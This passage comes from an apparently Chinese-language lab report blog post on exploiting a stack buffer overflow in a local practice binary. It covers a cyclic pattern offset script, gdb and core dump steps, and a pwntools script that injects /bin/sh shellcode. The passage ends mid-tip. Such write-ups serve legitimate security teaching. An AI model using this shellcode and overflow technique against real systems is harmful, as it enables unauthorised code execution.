class="string">&quot;6Uk7Uk8Uk9Ul0Ul1Ul2Ul3Ul4Ul5Ul6Ul7Ul8Ul9Um0Um1Um2Um3Um4Um5Um6Um7Um8Um9Un0Un1Un2U&quot;</span></span><br><span class="line"><span class="string">&quot;n3Un4Un5Un6Un7Un8Un9Uo0Uo1Uo2Uo3Uo4Uo5Uo6Uo7Uo8Uo9Up0Up1Up2Up3Up4Up5Up6Up7Up8Up9&quot;</span></span><br><span class="line"><span class="string">&quot;Uq0Uq1Uq2Uq3Uq4Uq5Uq6Uq7Uq8Uq9Ur0Ur1Ur2Ur3Ur4Ur5Ur6Ur7Ur8Ur9Us0Us1Us2Us3Us4Us5Us&quot;</span></span><br><span class="line"><span class="string">&quot;6Us7Us8Us9Ut0Ut1Ut2Ut3Ut4Ut5Ut6Ut7Ut8Ut9Uu0Uu1Uu2Uu3Uu4Uu5Uu6Uu7Uu8Uu9Uv0Uv1Uv2U&quot;</span></span><br><span class="line"><span class="string">&quot;v3Uv4Uv5Uv6Uv7Uv8Uv9Uw0Uw1Uw2Uw3Uw4Uw5Uw6Uw7Uw8Uw9Ux0Ux1Ux2Ux3Ux4Ux5Ux6Ux7Ux8Ux9&quot;</span></span><br><span class="line"><span class="string">&quot;Uy0Uy1Uy2Uy3Uy4Uy5Uy6Uy7Uy8Uy9Uz0Uz1Uz2Uz3Uz4Uz5Uz6Uz7Uz8Uz9Va0Va1Va2Va3Va4Va5Va&quot;</span></span><br><span class="line"><span class="string">&quot;6Va7Va8Va9Vb0Vb1Vb2Vb3Vb4Vb5Vb6Vb7Vb8Vb9Vc0Vc1Vc2Vc3Vc4Vc5Vc6Vc7Vc8Vc9Vd0Vd1Vd2V&quot;</span></span><br><span class="line"><span class="string">&quot;d3Vd4Vd5Vd6Vd7Vd8Vd9Ve0Ve1Ve2Ve3Ve4Ve5Ve6Ve7Ve8Ve9Vf0Vf1Vf2Vf3Vf4Vf5Vf6Vf7Vf8Vf9&quot;</span></span><br><span class="line"><span class="string">&quot;Vg0Vg1Vg2Vg3Vg4Vg5Vg6Vg7Vg8Vg9Vh0Vh1Vh2Vh3Vh4Vh5Vh6Vh7Vh8Vh9Vi0Vi1Vi2Vi3Vi4Vi5Vi&quot;</span></span><br><span class="line"><span class="string">&quot;6Vi7Vi8Vi9Vj0Vj1Vj2Vj3Vj4Vj5Vj6Vj7Vj8Vj9Vk0Vk1Vk2Vk3Vk4Vk5Vk6Vk7Vk8Vk9Vl0Vl1Vl2V&quot;</span></span><br><span class="line"><span class="string">&quot;l3Vl4Vl5Vl6Vl7Vl8Vl9Vm0Vm1Vm2Vm3Vm4Vm5Vm6Vm7Vm8Vm9Vn0Vn1Vn2Vn3Vn4Vn5Vn6Vn7Vn8Vn9&quot;</span></span><br><span class="line"><span class="string">&quot;Vo0Vo1Vo2Vo3Vo4Vo5Vo6Vo7Vo8Vo9Vp0Vp1Vp2Vp3Vp4Vp5Vp6Vp7Vp8Vp9Vq0Vq1Vq2Vq3Vq4Vq5Vq&quot;</span></span><br><span class="line"><span class="string">&quot;6Vq7Vq8Vq9Vr0Vr1Vr2Vr3Vr4Vr5Vr6Vr7Vr8Vr9Vs0Vs1Vs2Vs3Vs4Vs5Vs6Vs7Vs8Vs9Vt0Vt1Vt2V&quot;</span></span><br><span class="line"><span class="string">&quot;t3Vt4Vt5Vt6Vt7Vt8Vt9Vu0Vu1Vu2Vu3Vu4Vu5Vu6Vu7Vu8Vu9Vv0Vv1Vv2Vv3Vv4Vv5Vv6Vv7Vv8Vv9&quot;</span></span><br><span class="line"><span class="string">&quot;Vw0Vw1Vw2Vw3Vw4Vw5Vw6Vw7Vw8Vw9Vx0Vx1Vx2Vx3Vx4Vx5Vx6Vx7Vx8Vx9Vy0Vy1Vy2Vy3Vy4Vy5Vy&quot;</span></span><br><span class="line"><span class="string">&quot;6Vy7Vy8Vy9Vz0Vz1Vz2Vz3Vz4Vz5Vz6Vz7Vz8Vz9Wa0Wa1Wa2Wa3Wa4Wa5Wa6Wa7Wa8Wa9Wb0Wb1Wb2W&quot;</span></span><br><span class="line"><span class="string">&quot;b3Wb4Wb5Wb6Wb7Wb8Wb9Wc0Wc1Wc2Wc3Wc4Wc5Wc6Wc7Wc8Wc9Wd0Wd1Wd2Wd3Wd4Wd5Wd6Wd7Wd8Wd9&quot;</span></span><br><span class="line"><span class="string">&quot;We0We1We2We3We4We5We6We7We8We9Wf0Wf1Wf2Wf3Wf4Wf5Wf6Wf7Wf8Wf9Wg0Wg1Wg2Wg3Wg4Wg5Wg&quot;</span></span><br><span class="line"><span class="string">&quot;6Wg7Wg8Wg9Wh0Wh1Wh2Wh3Wh4Wh5Wh6Wh7Wh8Wh9Wi0Wi1Wi2Wi3Wi4Wi5Wi6Wi7Wi8Wi9Wj0Wj1Wj2W&quot;</span></span><br><span class="line"><span class="string">&quot;j3Wj4Wj5Wj6Wj7Wj8Wj9Wk0Wk1Wk2Wk3Wk4Wk5Wk6Wk7Wk8Wk9Wl0Wl1Wl2Wl3Wl4Wl5Wl6Wl7Wl8Wl9&quot;</span></span><br><span class="line"><span class="string">&quot;Wm0Wm1Wm2Wm3Wm4Wm5Wm6Wm7Wm8Wm9Wn0Wn1Wn2Wn3Wn4Wn5Wn6Wn7Wn8Wn9Wo0Wo1Wo2Wo3Wo4Wo5Wo&quot;</span></span><br><span class="line"><span class="string">&quot;6Wo7Wo8Wo9Wp0Wp1Wp2Wp3Wp4Wp5Wp6Wp7Wp8Wp9Wq0Wq1Wq2Wq3Wq4Wq5Wq6Wq7Wq8Wq9Wr0Wr1Wr2W&quot;</span></span><br><span class="line"><span class="string">&quot;r3Wr4Wr5Wr6Wr7Wr8Wr9Ws0Ws1Ws2Ws3Ws4Ws5Ws6Ws7Ws8Ws9Wt0Wt1Wt2Wt3Wt4Wt5Wt6Wt7Wt8Wt9&quot;</span></span><br><span class="line"><span class="string">&quot;Wu0Wu1Wu2Wu3Wu4Wu5Wu6Wu7Wu8Wu9Wv0Wv1Wv2Wv3Wv4Wv5Wv6Wv7Wv8Wv9Ww0Ww1Ww2Ww3Ww4Ww5Ww&quot;</span></span><br><span class="line"><span class="string">&quot;6Ww7Ww8Ww9Wx0Wx1Wx2Wx3Wx4Wx5Wx6Wx7Wx8Wx9Wy0Wy1Wy2Wy3Wy4Wy5Wy6Wy7Wy8Wy9Wz0Wz1Wz2W&quot;</span></span><br><span class="line"><span class="string">&quot;z3Wz4Wz5Wz6Wz7Wz8Wz9Xa0Xa1Xa2Xa3Xa4Xa5Xa6Xa7Xa8Xa9Xb0Xb1Xb2Xb3Xb4Xb5Xb6Xb7Xb8Xb9&quot;</span></span><br><span class="line"><span class="string">&quot;Xc0Xc1Xc2Xc3Xc4Xc5Xc6Xc7Xc8Xc9Xd0Xd1Xd2Xd3Xd4Xd5Xd6Xd7Xd8Xd9Xe0Xe1Xe2Xe3Xe4Xe5Xe&quot;</span></span><br><span class="line"><span class="string">&quot;6Xe7Xe8Xe9Xf0Xf1Xf2Xf3Xf4Xf5Xf6Xf7Xf8Xf9Xg0Xg1Xg2Xg3Xg4Xg5Xg6Xg7Xg8Xg9Xh0Xh1Xh2X&quot;</span></span><br><span class="line"><span class="string">&quot;h3Xh4Xh5Xh6Xh7Xh8Xh9Xi0Xi1Xi2Xi3Xi4Xi5Xi6Xi7Xi8Xi9Xj0Xj1Xj2Xj3Xj4Xj5Xj6Xj7Xj8Xj9&quot;</span></span><br><span class="line"><span class="string">&quot;Xk0Xk1Xk2Xk3Xk4Xk5Xk6Xk7Xk8Xk9Xl0Xl1Xl2Xl3Xl4Xl5Xl6Xl7Xl8Xl9Xm0Xm1Xm2Xm3Xm4Xm5Xm&quot;</span></span><br><span class="line"><span class="string">&quot;6Xm7Xm8Xm9Xn0Xn1Xn2Xn3Xn4Xn5Xn6Xn7Xn8Xn9Xo0Xo1Xo2Xo3Xo4Xo5Xo6Xo7Xo8Xo9Xp0Xp1Xp2X&quot;</span></span><br><span class="line"><span class="string">&quot;p3Xp4Xp5Xp6Xp7Xp8Xp9Xq0Xq1Xq2Xq3Xq4Xq5Xq6Xq7Xq8Xq9Xr0Xr1Xr2Xr3Xr4Xr5Xr6Xr7Xr8Xr9&quot;</span></span><br><span class="line"><span class="string">&quot;Xs0Xs1Xs2Xs3Xs4Xs5Xs6Xs7Xs8Xs9Xt0Xt1Xt2Xt3Xt4Xt5Xt6Xt7Xt8Xt9Xu0Xu1Xu2Xu3Xu4Xu5Xu&quot;</span></span><br><span class="line"><span class="string">&quot;6Xu7Xu8Xu9Xv0Xv1Xv2Xv3Xv4Xv5Xv6Xv7Xv8Xv9Xw0Xw1Xw2Xw3Xw4Xw5Xw6Xw7Xw8Xw9Xx0Xx1Xx2X&quot;</span></span><br><span class="line"><span class="string">&quot;x3Xx4Xx5Xx6Xx7Xx8Xx9Xy0Xy1Xy2Xy3Xy4Xy5Xy6Xy7Xy8Xy9Xz0Xz1Xz2Xz3Xz4Xz5Xz6Xz7Xz8Xz9&quot;</span></span><br><span class="line"><span class="string">&quot;Ya0Ya1Ya2Ya3Ya4Ya5Ya6Ya7Ya8Ya9Yb0Yb1Yb2Yb3Yb4Yb5Yb6Yb7Yb8Yb9Yc0Yc1Yc2Yc3Yc4Yc5Yc&quot;</span></span><br><span class="line"><span class="string">&quot;6Yc7Yc8Yc9Yd0Yd1Yd2Yd3Yd4Yd5Yd6Yd7Yd8Yd9Ye0Ye1Ye2Ye3Ye4Ye5Ye6Ye7Ye8Ye9Yf0Yf1Yf2Y&quot;</span></span><br><span class="line"><span class="string">&quot;f3Yf4Yf5Yf6Yf7Yf8Yf9Yg0Yg1Yg2Yg3Yg4Yg5Yg6Yg7Yg8Yg9Yh0Yh1Yh2Yh3Yh4Yh5Yh6Yh7Yh8Yh9&quot;</span></span><br><span class="line"><span class="string">&quot;Yi0Yi1Yi2Yi3Yi4Yi5Yi6Yi7Yi8Yi9Yj0Yj1Yj2Yj3Yj4Yj5Yj6Yj7Yj8Yj9Yk0Yk1Yk2Yk3Yk4Yk5Yk&quot;</span></span><br><span class="line"><span class="string">&quot;6Yk7Yk8Yk9Yl0Yl1Yl2Yl3Yl4Yl5Yl6Yl7Yl8Yl9Ym0Ym1Ym2Ym3Ym4Ym5Ym6Ym7Ym8Ym9Yn0Yn1Yn2Y&quot;</span></span><br><span class="line"><span class="string">&quot;n3Yn4Yn5Yn6Yn7Yn8Yn9Yo0Yo1Yo2Yo3Yo4Yo5Yo6Yo7Yo8Yo9Yp0Yp1Yp2Yp3Yp4Yp5Yp6Yp7Yp8Yp9&quot;</span></span><br><span class="line"><span class="string">&quot;Yq0Yq1Yq2Yq3Yq4Yq5Yq6Yq7Yq8Yq9Yr0Yr1Yr2Yr3Yr4Yr5Yr6Yr7Yr8Yr9Ys0Ys1Ys2Ys3Ys4Ys5Ys&quot;</span></span><br><span class="line"><span class="string">&quot;6Ys7Ys8Ys9Yt0Yt1Yt2Yt3Yt4Yt5Yt6Yt7Yt8Yt9Yu0Yu1Yu2Yu3Yu4Yu5Yu6Yu7Yu8Yu9Yv0Yv1Yv2Y&quot;</span></span><br><span class="line"><span class="string">&quot;v3Yv4Yv5Yv6Yv7Yv8Yv9Yw0Yw1Yw2Yw3Yw4Yw5Yw6Yw7Yw8Yw9Yx0Yx1Yx2Yx3Yx4Yx5Yx6Yx7Yx8Yx9&quot;</span></span><br><span class="line"><span class="string">&quot;Yy0Yy1Yy2Yy3Yy4Yy5Yy6Yy7Yy8Yy9Yz0Yz1Yz2Yz3Yz4Yz5Yz6Yz7Yz8Yz9Za0Za1Za2Za3Za4Za5Za&quot;</span></span><br><span class="line"><span class="string">&quot;6Za7Za8Za9Zb0Zb1Zb2Zb3Zb4Zb5Zb6Zb7Zb8Zb9Zc0Zc1Zc2Zc3Zc4Zc5Zc6Zc7Zc8Zc9Zd0Zd1Zd2Z&quot;</span></span><br><span class="line"><span class="string">&quot;d3Zd4Zd5Zd6Zd7Zd8Zd9Ze0Ze1Ze2Ze3Ze4Ze5Ze6Ze7Ze8Ze9Zf0Zf1Zf2Zf3Zf4Zf5Zf6Zf7Zf8Zf9&quot;</span></span><br><span class="line"><span class="string">&quot;Zg0Zg1Zg2Zg3Zg4Zg5Zg6Zg7Zg8Zg9Zh0Zh1Zh2Zh3Zh4Zh5Zh6Zh7Zh8Zh9Zi0Zi1Zi2Zi3Zi4Zi5Zi&quot;</span></span><br><span class="line"><span class="string">&quot;6Zi7Zi8Zi9Zj0Zj1Zj2Zj3Zj4Zj5Zj6Zj7Zj8Zj9Zk0Zk1Zk2Zk3Zk4Zk5Zk6Zk7Zk8Zk9Zl0Zl1Zl2Z&quot;</span></span><br><span class="line"><span class="string">&quot;l3Zl4Zl5Zl6Zl7Zl8Zl9Zm0Zm1Zm2Zm3Zm4Zm5Zm6Zm7Zm8Zm9Zn0Zn1Zn2Zn3Zn4Zn5Zn6Zn7Zn8Zn9&quot;</span></span><br><span class="line"><span class="string">&quot;Zo0Zo1Zo2Zo3Zo4Zo5Zo6Zo7Zo8Zo9Zp0Zp1Zp2Zp3Zp4Zp5Zp6Zp7Zp8Zp9Zq0Zq1Zq2Zq3Zq4Zq5Zq&quot;</span></span><br><span class="line"><span class="string">&quot;6Zq7Zq8Zq9Zr0Zr1Zr2Zr3Zr4Zr5Zr6Zr7Zr8Zr9Zs0Zs1Zs2Zs3Zs4Zs5Zs6Zs7Zs8Zs9Zt0Zt1Zt2Z&quot;</span></span><br><span class="line"><span class="string">&quot;t3Zt4Zt5Zt6Zt7Zt8Zt9Zu0Zu1Zu2Zu3Zu4Zu5Zu6Zu7Zu8Zu9Zv0Zv1Zv2Zv3Zv4Zv5Zv6Zv7Zv8Zv9&quot;</span></span><br><span class="line"><span class="string">&quot;Zw0Zw1Zw2Zw3Zw4Zw5Zw6Zw7Zw8Zw9Zx0Zx1Zx2Zx3Zx4Zx5Zx6Zx7Zx8Zx9Zy0Zy1Zy2Zy3Zy4Zy5Zy&quot;</span></span><br><span class="line"><span class="string">&quot;6Zy7Zy8Zy9Zz0Zz1Zz2Zz3Zz4Zz5Zz6Zz7Zz8Zz9&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_error</span>(<span class="params">msg</span>):</span><br><span class="line">    sys.stderr.write(os.linesep * <span class="number">2</span> + <span class="string">&quot;ERROR: &quot;</span> + msg + os.linesep * <span class="number">3</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bare_words</span>():</span><br><span class="line">    string = <span class="string">&quot; &quot;</span>.join(sys.argv[<span class="number">1</span>:])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;The used string: =&gt;&quot;</span> + string + <span class="string">&quot;&lt;=&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_help</span>():</span><br><span class="line">    <span class="built_in">print</span>(sys.argv[<span class="number">0</span>] + <span class="string">&quot; create &lt;int&gt;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\tReturns a pattern of &lt;int&gt; chars.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(sys.argv[<span class="number">0</span>] + <span class="string">&quot; offset &lt;str&gt; [size &lt;int&gt;]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(</span><br><span class="line">        <span class="string">&quot;\tReturns the offset for the provided argument &lt;str&gt;. Must be at least &quot;</span></span><br><span class="line">        <span class="string">&quot;three chars for non ambiguous match. May be a hex value. The conversion&quot;</span></span><br><span class="line">        <span class="string">&quot;is done automatically for little endian architectures (ie: x86). This &quot;</span></span><br><span class="line">        <span class="string">&quot;basically means that the string obtained from hex conversion is &quot;</span></span><br><span class="line">        <span class="string">&quot;reversed. WARNING: The hex decoding is skipped for valid hex values &quot;</span></span><br><span class="line">        <span class="string">&quot;that are part of the buffer itself as the hex decoding is a fallback &quot;</span></span><br><span class="line">        <span class="string">&quot;measure. Always use the 0x prefix in order to force the hex decoding.&quot;</span></span><br><span class="line">        <span class="string">&quot;&quot;</span> + os.linesep + <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="string">&quot;\tFor patterns longer than 20280 chars you must provide the optional &quot;</span></span><br><span class="line">        <span class="string">&quot;argument size in order to receive all the offsets for the Aa0 pattern.&quot;</span></span><br><span class="line">    )</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_pattern</span>(<span class="params">size</span>):</span><br><span class="line">    size = <span class="built_in">int</span>(size)</span><br><span class="line">    count = size // <span class="number">20280</span></span><br><span class="line">    inc = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> inc &lt; count:</span><br><span class="line">        sys.stdout.write(buf)</span><br><span class="line">        inc += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    mod = size % <span class="number">20280</span></span><br><span class="line">    sys.stdout.write(buf[:mod] + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_offset</span>(<span class="params">offset</span>):</span><br><span class="line">    offset = offset.replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        offset = binascii.unhexlify(offset)</span><br><span class="line">        offset = offset[::-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment"># 反转并解码为字符串</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;hex pattern decoded as: &quot;</span> + offset)</span><br><span class="line">        <span class="keyword">return</span> offset</span><br><span class="line">    <span class="keyword">except</span> (TypeError, binascii.Error):</span><br><span class="line">        show_error(<span class="string">&quot;Invalid input offset.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_offset</span>(<span class="params">offset, size</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pos = buf.index(offset)</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(pos)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            position = []</span><br><span class="line">            count = size // <span class="number">20280</span></span><br><span class="line">            inc = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span> inc &lt; count:</span><br><span class="line">                position.append(<span class="built_in">str</span>(inc * <span class="number">20280</span> + pos))</span><br><span class="line">                inc += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            mod = size % <span class="number">20280</span></span><br><span class="line">            <span class="keyword">if</span> pos + <span class="built_in">len</span>(offset) &lt;= mod:</span><br><span class="line">                position.append(<span class="built_in">str</span>(inc * <span class="number">20280</span> + pos))</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(os.linesep.join(position))</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        offset = decode_offset(offset)</span><br><span class="line">        show_offset(offset, size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        show_help()</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] != <span class="string">&quot;create&quot;</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] != <span class="string">&quot;offset&quot;</span>:</span><br><span class="line">        show_help()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;create&quot;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> sys.argv[<span class="number">2</span>].isdigit():</span><br><span class="line">                    show_pattern(sys.argv[<span class="number">2</span>])</span><br><span class="line">            <span class="keyword">except</span> IndexError:</span><br><span class="line">                show_error(<span class="string">&quot;You need to supply the &lt;int&gt; value for the create action.&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;offset&quot;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> sys.argv[<span class="number">2</span>]:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        size = <span class="built_in">int</span>(sys.argv[<span class="number">3</span>])</span><br><span class="line">                    <span class="keyword">except</span> IndexError:</span><br><span class="line">                        size = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">                    show_offset(sys.argv[<span class="number">2</span>], size)</span><br><span class="line">            <span class="keyword">except</span> IndexError:</span><br><span class="line">                show_error(<span class="string">&quot;You need to supply the &lt;str&gt; value for the offset action.&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        show_error(<span class="string">&quot;Keyboard interrupt received. Educated guess: the script took too long to execute. You used a really long size, didn&#x27;t you?&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@moyuan-virtual-machine:/home/moyuan/桌面<span class="comment"># python pattern.py create 150</span></span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</span><br><span class="line">root@moyuan-virtual-machine:/home/moyuan/桌面<span class="comment"># </span></span><br></pre></td></tr></table></figure>
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241115180943354.png" class="" title="image-20241115180943354">
<p><code>gdb ./level1</code> -&gt; 调试程序</p>
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241115181109460.png" class="" title="image-20241115181109460">
<p><code>r</code>  -&gt; 运行，输入之前用脚本创造的字符串</p>
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241115181418623.png" class="" title="image-20241115181418623">
<p>再使用 python 脚本来计算一下偏移： <code>python pattern.py offset 0x37654136</code></p>
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241115181545175.png" class="" title="image-20241115181545175">
<p>这里解释一下，在 gdb 里报错的原因是本来的返回地址被我们输入的字符串覆盖掉了，覆盖为了0x37654136，当程序去返回的时候出错了，使用 pattern.py offset计算出来的就是整个栈的大小，把 0x37654136 改成找到的地址就可以执行我们的语句了</p>
<p>还有个问题：    gdb 的调试环境会影响 buf 在内存中的位置，虽然我们关闭了 ASLR，但这只能保证 buf 的地址在 gdb 的调试环境中不变，但当我们直接执行 ./level1 的时候，buf 的位置会固定在别的地址上</p>
<p>这里采用的方法是开启：core dump </p>
<p><code>ulimit -c unlimited</code> （这里之前是没啥的，但是又一次做的时候只有在root下最后才能成功）</p>
<p>开启之后，当出现内存错误的时候，系统会生成一个 core dump 文件在当前目录下。然后我们再用 gdb 查看这个 core 文件就可以获取到 buf 真正的地址了。</p>
<p><strong>修改核心转储行为：</strong> 默认核心转储被 <code>apport</code> 工具接管，需修改配置让核心转储文件直接保存到当前目录：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl stop apport.service</span><br><span class="line">sudo systemctl <span class="built_in">disable</span> apport.service</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;core&quot;</span> | sudo <span class="built_in">tee</span> /proc/sys/kernel/core_pattern</span><br><span class="line"><span class="built_in">cat</span> /proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure>
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241115214237264.png" class="" title="image-20241115214237264">
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241115214303850.png" class="" title="image-20241115214303850">
<p>使用gdb调试转储的 <code>gdb level1 core.6021</code>  (core 会有后缀)</p>
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241116042329502.png" class="" title="image-20241116042329502">
<p>使用 <code>x/10s $esp-144</code> 查看shellcode地址<code>0xffffd370</code></p>
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241116042421771.png" class="" title="image-20241116042421771">
<p>为什么是 esp-144 ？因为我们报错的时候其实已经执行的到返回地址了，所以要在 140 的栈空间的基础上加上 4 字节的返回地址空间</p>
<p>用 python 结合 pwntools 写利用脚本</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pwntools -i https://pypi.tuna.tsinghua.edu.cn/simple //安装pwn库</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动目标程序</span></span><br><span class="line">p = process(<span class="string">&#x27;./level1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回地址（需根据实际情况调整）</span></span><br><span class="line">ret = <span class="number">0xffffd370</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode 需要是字节串</span></span><br><span class="line">shellcode = <span class="string">b&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x0b\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 payload</span></span><br><span class="line">payload =shellcode + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">140</span> - <span class="built_in">len</span>(shellcode)) + p32(ret)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"><span class="comment"># 发送 payload</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>Tip: 为什么 Shellcode 在 GDB 中运行成功而直接运行失败？</strong></p>
<p>在调试程序时，<strong>GDB</strong> 会为进程添加大量的环境变量，这些变量存储在栈中，导致栈占用更多空间，地址变低。而直接运行程序时，由于没有 GDB 的干扰，栈地址比在 GDB 中运行时更高。这种栈地址的变化使得在 GDB 中找到的返回地址在直接运行时可能会失效，导致 Shellcode 无法执行。</p>
<p><strong>解决方法：</strong></p>
<ol>
<li>将返回地址适当调整到更高的地址，以匹配直接运行时的栈布局。</li>
